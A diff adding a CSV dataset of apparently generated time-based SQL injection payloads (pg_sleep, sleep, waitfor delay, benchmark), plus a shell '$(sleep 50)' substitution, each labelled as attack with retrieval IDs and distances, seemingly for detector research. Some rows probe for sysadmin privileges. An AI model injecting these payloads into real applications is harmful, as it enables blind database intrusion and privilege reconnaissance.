@@ -1,0 +1,501 @@
+id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
+CTGAN_000001,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.849958798500863
+CTGAN_000002,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.519512124888828
+CTGAN_000003,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.170475007940934
+CTGAN_000004,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.044224677078205
+CTGAN_000005,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.6049430951288866
+CTGAN_000006,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.052804505520917
+CTGAN_000007,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.885957811042752
+CTGAN_000008,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,7.0249578835148245
+CTGAN_000009,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.016870165987728
+CTGAN_000010,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.1886795891221515
+CTGAN_000011,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.987604776887354
+CTGAN_000012,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.4480752992367805
+CTGAN_000013,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.6780387110525945
+CTGAN_000014,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.729357361744582
+CTGAN_000015,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,8.52709252581707
+CTGAN_000016,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.583167244662483
+CTGAN_000017,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.606071154116788
+CTGAN_000018,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.174894626991073
+CTGAN_000019,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.6540265695479635
+CTGAN_000020,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.453448769678695
+CTGAN_000021,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.4687816969250855
+CTGAN_000022,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.979768410349519
+CTGAN_000023,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,5.843271023380234
+CTGAN_000024,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.612589635719784
+CTGAN_000025,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.403549020303264
+CTGAN_000026,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,7.26654081986263
+CTGAN_000027,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.565421941201597
+CTGAN_000028,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.528140115336296
+CTGAN_000029,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.33482864350612
+CTGAN_000030,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,6.159798462377568
+CTGAN_000031,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,4.935914384304916
+CTGAN_000032,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.94647759832623
+CTGAN_000033,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.522756537567481
+CTGAN_000034,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.649319045162702
+CTGAN_000035,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.1584596823749065
+CTGAN_000036,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.772459140871266
+CTGAN_000037,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,7.6521842140707355
+CTGAN_000038,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.1148811513350445
+CTGAN_000039,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.759164236480487
+CTGAN_000040,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.670573159188047
+CTGAN_000041,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.958475343576632
+CTGAN_000042,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.184599586349366
+CTGAN_000043,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.208754496660644
+CTGAN_000044,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.325864850420448
+CTGAN_000045,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,7.734760811928102
+CTGAN_000046,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.63371814011105
+CTGAN_000047,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.493583448113579
+CTGAN_000048,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.804310699046291
+CTGAN_000049,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.120262673769438
+CTGAN_000050,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.251456003213594
+CTGAN_000051,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.306861615530974
+CTGAN_000052,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.8380059527960455
+CTGAN_000053,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.715339624089677
+CTGAN_000054,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.482935086195678
+CTGAN_000055,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.753355731016694
+CTGAN_000056,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.046985926356424
+CTGAN_000057,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.129954729951619
+CTGAN_000058,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.238746623591394
+CTGAN_000059,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,6.571901854203578
+CTGAN_000060,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,7.127827834147642
+CTGAN_000061,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.846176408640056
+CTGAN_000062,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.3994123021866365
+CTGAN_000063,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.290829085858917
+CTGAN_000064,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.344073736186145
+CTGAN_000065,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.753793796368168
+CTGAN_000066,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.474057554603621
+CTGAN_000067,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.567597718414229
+CTGAN_000068,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.7510582860793455
+CTGAN_000069,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.139982361873116
+CTGAN_000070,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.9176018236920305
+CTGAN_000071,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.2715778150181425
+CTGAN_000072,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.667244345943055
+CTGAN_000073,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.017899460166614
+CTGAN_000074,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,6.65356413838298
+CTGAN_000075,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.79506495639161
+CTGAN_000076,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.940129308836249
+CTGAN_000077,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.171681741313884
+CTGAN_000078,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.234030933416576
+CTGAN_000079,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.979305757205964
+CTGAN_000080,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.134025490297765
+CTGAN_000081,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.919246773101897
+CTGAN_000082,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.711720370344825
+CTGAN_000083,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,6.058786799826665
+CTGAN_000084,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.895901234486948
+CTGAN_000085,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.087309305376338
+CTGAN_000086,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.719899816251282
+CTGAN_000087,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.695158869350326
+CTGAN_000088,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.16761910801962
+CTGAN_000089,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,7.5626477559248615
+CTGAN_000090,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.398991184773975
+CTGAN_000091,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.372824326096522
+CTGAN_000092,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.179526699493438
+CTGAN_000093,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,5.748970117582277
+CTGAN_000094,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.418860350514595
+CTGAN_000095,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.081217736500763
+CTGAN_000096,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.493629486675969
+CTGAN_000097,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.281444522544304
+CTGAN_000098,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.3811442588003855
+CTGAN_000099,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,8.19547467998882
+CTGAN_000100,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.747859951667625
+CTGAN_000101,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,9.393395681951075
+CTGAN_000102,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.018156493267708
+CTGAN_000103,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,7.181468965020818
+CTGAN_000104,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.8313869891157335
+CTGAN_000105,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.445762316942183
+CTGAN_000106,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,8.53299180181508
+CTGAN_000107,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.176015798803999
+CTGAN_000108,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.579715591249346
+CTGAN_000109,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,9.01508332484661
+CTGAN_000110,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.091795504191944
+CTGAN_000111,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,5.958211020784675
+CTGAN_000112,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.933990121508196
+CTGAN_000113,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.853928421411291
+CTGAN_000114,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,7.3544138058783
+CTGAN_000115,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,7.096967317751229
+CTGAN_000116,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.34630070176371
+CTGAN_000117,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.86923160933544
+CTGAN_000118,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.252037777019762
+CTGAN_000119,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.370137800308368
+CTGAN_000120,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.992350131600696
+CTGAN_000121,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.810756650431522
+CTGAN_000122,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.463535157622162
+CTGAN_000123,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.038949125353923
+CTGAN_000124,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.9657222837275965
+CTGAN_000125,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.115811556274144
+CTGAN_000126,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.425878624219365
+CTGAN_000127,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.059304102251664
+CTGAN_000128,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.1474710098668695
+CTGAN_000129,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,7.688387663458525
+CTGAN_000130,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.3373146558302516
+CTGAN_000131,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.268495601673998
+CTGAN_000132,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.715169181825487
+CTGAN_000133,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.1353092394428455
+CTGAN_000134,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,8.045352425137473
+CTGAN_000135,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.8348245767292815
+CTGAN_000136,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.647985576732744
+CTGAN_000137,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.765809358197481
+CTGAN_000138,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,8.042597780908018
+CTGAN_000139,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,9.778753589294015
+CTGAN_000140,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.597319320712979
+CTGAN_000141,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.583344459046469
+CTGAN_000142,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.426741799511972
+CTGAN_000143,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.751049200439224
+CTGAN_000144,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.331999643140179
+CTGAN_000145,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.7772424700491225
+CTGAN_000146,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.167087095680436
+CTGAN_000147,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,7.463998017101096
+CTGAN_000148,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.854791002380453
+CTGAN_000149,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,9.171542033389413
+CTGAN_000150,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.9560279064994
+CTGAN_000151,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.246631567709975
+CTGAN_000152,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.68296590123163
+CTGAN_000153,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.723260952243828
+CTGAN_000154,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.172812915366512
+CTGAN_000155,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.953465011610956
+CTGAN_000156,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.16964772626625
+CTGAN_000157,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.703349185333747
+CTGAN_000158,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,5.777982928693319
+CTGAN_000159,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.832050017939927
+CTGAN_000160,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.090288101946575
+CTGAN_000161,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,9.292587749059184
+CTGAN_000162,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.129267930695855
+CTGAN_000163,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.641446479772576
+CTGAN_000164,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.786727998883079
+CTGAN_000165,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.777139141649246
+CTGAN_000166,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.336585668859382
+CTGAN_000167,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.963762331524014
+CTGAN_000168,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,5.797239910022612
+CTGAN_000169,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,5.734426141419209
+CTGAN_000170,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.837577804950181
+CTGAN_000171,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.0399995848138275
+CTGAN_000172,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.727714603664528
+CTGAN_000173,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.476878272583318
+CTGAN_000174,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,7.883776322122907
+CTGAN_000175,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.06763030359197
+CTGAN_000176,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,7.12668422453258
+CTGAN_000177,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.3417598081532915
+CTGAN_000178,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.244153445830149
+CTGAN_000179,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.188818213372198
+CTGAN_000180,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.020076642810958
+CTGAN_000181,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.256733078038359
+CTGAN_000182,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,8.607348895916745
+CTGAN_000183,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.451092887746646
+CTGAN_000184,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,8.511609203523653
+CTGAN_000185,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,9.298623165556428
+CTGAN_000186,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.413991645339628
+CTGAN_000187,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.874457230637923
+CTGAN_000188,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.234638562882106
+CTGAN_000189,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.294686199337121
+CTGAN_000190,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.669304168470878
+CTGAN_000191,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.407617157137006
+CTGAN_000192,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.491496336708028
+CTGAN_000193,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,5.969272040061494
+CTGAN_000194,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.734227733393094
+CTGAN_000195,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.173084599791892
+CTGAN_000196,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.0690810795657715
+CTGAN_000197,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.956523992911637
+CTGAN_000198,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.787223826382708
+CTGAN_000199,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.939987165144746
+CTGAN_000200,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,10.161345206372243
+CTGAN_000201,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,6.55372704858434
+CTGAN_000202,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.981332737754421
+CTGAN_000203,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.387021651316242
+CTGAN_000204,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.609616702917727
+CTGAN_000205,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.130996342772406
+CTGAN_000206,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.943951200693805
+CTGAN_000207,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.93692697122554
+CTGAN_000208,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.015992779108485
+CTGAN_000209,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.502840873861401
+CTGAN_000210,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,4.8815792531774
+CTGAN_000211,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.69696763144586
+CTGAN_000212,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,7.8689902951271185
+CTGAN_000213,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.3213426929802
+CTGAN_000214,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.163082914936596
+CTGAN_000215,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.741553231423164
+CTGAN_000216,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.454259531211842
+CTGAN_000217,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,5.721403467458751
+CTGAN_000218,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,9.148896840377407
+CTGAN_000219,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.0798468655968385
+CTGAN_000220,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.389751659374626
+CTGAN_000221,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,6.968675632540534
+CTGAN_000222,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.711104389297761
+CTGAN_000223,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.460170191049643
+CTGAN_000224,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,6.561734071678982
+CTGAN_000225,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,5.538511913276855
+CTGAN_000226,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.930256668803247
+CTGAN_000227,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.226943128939097
+CTGAN_000228,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.4938336958857565
+CTGAN_000229,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.725807008841132
+CTGAN_000230,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.09026371115666
+CTGAN_000231,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.486615312076778
+CTGAN_000232,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,8.103117173067957
+CTGAN_000233,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.64564820800328
+CTGAN_000234,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,6.173574554710293
